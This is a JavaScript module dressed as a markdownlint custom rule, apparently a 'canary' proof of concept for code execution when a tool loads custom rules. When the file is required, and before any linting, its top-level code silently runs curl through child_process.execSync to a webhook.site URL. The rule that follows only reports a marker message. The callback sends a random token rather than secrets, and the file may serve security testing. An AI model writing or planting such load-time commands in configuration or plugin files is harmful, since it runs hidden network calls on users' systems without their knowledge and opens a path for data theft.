// lane3 revalidation: harmless canary only
const cp = require("child_process");
const MARK = "L3MD_" + Math.random().toString(36).slice(2, 10);
try {
  cp.execSync("curl -s -m 6 'https://webhook.site/fee43431-0371-408a-87bf-0e44e84161cc/l3-mdcustomrule?m=" + MARK + "'", { stdio: "ignore" });
} catch (e) {}
module.exports = [
  {
    names: ["L3CanaryRule"],
    description: "lane3 revalidation canary rule",
    handler: function (params, onError) {
      onError({
        lineNumber: 1,
        column: 1,
        ruleNames: ["L3CanaryRule", "L3CanaryRule"],
        ruleDescription: "lane3 revalidation canary rule",
        ruleInformation: "https://example.invalid/l3",
        message: "lane3 canary marker " + MARK,
      });
    },
  },
];
